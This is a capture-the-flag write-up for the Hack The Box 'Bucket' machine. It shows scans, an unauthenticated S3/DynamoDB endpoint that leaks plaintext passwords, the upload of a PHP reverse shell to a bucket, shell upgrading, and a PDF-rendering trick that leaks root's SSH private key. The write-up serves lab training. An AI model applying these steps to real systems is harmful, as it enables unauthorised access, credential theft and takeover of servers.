# Hack The Box [Bucket](https://app.hackthebox.eu/machines/Bucket)
### References
* Hammond, J. (2021). Plundering AWS S3 Buckets - HackTheBox [YouTube Video]. In YouTube. https://youtu.be/5YweYcXoch8
* IppSec. (2021). HackTheBox - Bucket [YouTube Video]. In YouTube. https://youtu.be/SgWhuTxm2oYpyt
## Reconnaissance
1. `nmap`:
```bash
$ nmap -sC -sV 10.10.10.212 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 17:29 AEST
Nmap scan report for 10.10.10.212
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```
   * `/etc/hosts`:
```
10.10.10.212 bucket.htb
10.10.10.212 s3.bucket.htb
```
   * `http://s3.bucket.htb/` returns:
```json
{
	"status": "running"
}
```
2. `gobuster`:
```bash
$ gobuster dir -u http://s3.bucket.htb/ -w $(pwd)/directory-list-2.3-medium.txt     
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/applegamer22/Documents/CTFs/Hack_The_Box/Bucket/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/27 17:35:44 Starting gobuster in directory enumeration mode
===============================================================
/health               (Status: 200) [Size: 54]
/shell                (Status: 200) [Size: 0] 
/shellcode            (Status: 500) [Size: 158]
/shells               (Status: 500) [Size: 158]
/shellscripts         (Status: 500) [Size: 158]
/shellen              (Status: 500) [Size: 158]
/shellcity            (Status: 500) [Size: 158]
/shell_screenshot     (Status: 500) [Size: 158]
/shelley              (Status: 500) [Size: 158]
/shell01              (Status: 500) [Size: 158]
/shell02              (Status: 500) [Size: 158]
/shell-scripts        (Status: 500) [Size: 158]
/server-status        (Status: 403) [Size: 278]
/shellsub             (Status: 500) [Size: 158]
/shellutils           (Status: 500) [Size: 158]
/shellsrptg           (Status: 500) [Size: 158]
/shelldu              (Status: 500) [Size: 158]
/shellicon            (Status: 500) [Size: 158]
/shellnet             (Status: 500) [Size: 158]
/shellme              (Status: 500) [Size: 158]
/shellcoders          (Status: 500) [Size: 158]
/shellark             (Status: 500) [Size: 158]
/shelltree            (Status: 500) [Size: 158]
/shellgreek           (Status: 500) [Size: 158]
/shellcoders-handbook (Status: 500) [Size: 158]
                                               
===============================================================
2021/04/27 18:07:34 Finished
```
   * `http://s3.bucket.htb/health`:
```json
{
	"services": {
		"s3": "running",
		"dynamodb": "running"
	}
}
```
2. 
```bash
$ aws configure
AWS Access Key ID [None]: AppleGamer22
AWS Secret Access Key [None]: AppleGamer22
Default region name [None]: Sydney
Default output format [None]: json
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/
{
    "TableNames": [
        "users"
    ]
}
$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
$ aws s3api list-buckets --endpoint-url http://s3.bucket.htb/
{
    "Buckets": [
        {
            "Name": "adserver",
            "CreationDate": "2021-04-27T07:52:07.979386Z"
        }
    ],
    "Owner": {
        "DisplayName": "webfile",
        "ID": "bcaf1ffd86f41161ca5fb16fd081034f"
    }
}
$ aws s3 --endpoint-url http://s3.bucket.htb/ ls adserver
                           PRE images/
2021-04-27 17:54:10       5344 index.html
$ aws s3 --endpoint-url http://s3.bucket.htb/ ls adserver/images/
2021-04-27 17:54:10      37840 bug.jpg
2021-04-27 17:54:10      51485 cloud.png
2021-04-27 17:54:10      16486 malware.png
$ aws s3 --endpoint-url http://s3.bucket.htb/ cp php-reverse-shell.php s3://adserver/php-reverse-shell.php
upload: ./php-reverse-shell.php to s3://adserver/php-reverse-shell.php
06:06:08 PM via applegamer22 on manjaro in CTFs/Hack_The_Box/Bucket on  master [?] 
$ aws s3 --endpoint-url http://s3.bucket.htb/ ls adserver/                                  PRE images/
2021-04-27 18:06:09       5344 index.html
2021-04-27 18:06:50       5490 php-reverse-shell.php
```
```
$ ls /home
roy
$ cd /home/roy
$ ls -la
total 36
drwxr-xr-x 5 roy  roy  4096 Apr 27 07:25 .
drwxr-xr-x 3 root root 4096 Sep 16  2020 ..
lrwxrwxrwx 1 roy  roy     9 Sep 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16  2020 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16  2020 .bashrc
drwx------ 2 roy  roy  4096 Apr 27 07:25 .cache
-rw-r--r-- 1 roy  roy   807 Sep 16  2020 .profile
drwx------ 2 roy  roy  4096 Apr 27 07:24 .ssh
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 project
-r-------- 1 roy  roy    33 Apr 27 04:35 user.txt
```

`python3 -c 'import pty;pty.spawn("/bin/bash")'`
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bucket:/$ ls /home
ls /home
roy
www-data@bucket:/$ ls /home/roy
project  user.txt
roy@bucket:/var/www/bucket-app$ cat index.php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>
```
1. Run the `exploit.sh` script on your machine to generate the alert.
2. Run `curl --data "action=get_alerts" http://localhost:8000` on the server with username `roy` and password `n2vM-<_K_Q:.Aa2` to generate the PDF.
3. Run `sshpass -p 'n2vM-<_K_Q:.Aa2' scp roy@bucket.htb:/var/www/bucket-app/files/result.pdf .` on your machine to copy the PDF.
4. Copy the contents of `result.pdf` to an `id_rsa` and run `chmod 600 id_rsa`.
5. Login to the server as root:
```bash
$  ssh -i id_rsa root@bucket.htb
root@bucket:~# cat root.txt 
5b55dbb6d81f6fce848ca6a61045a6a6
```

**Flag**: `5b55dbb6d81f6fce848ca6a61045a6a6`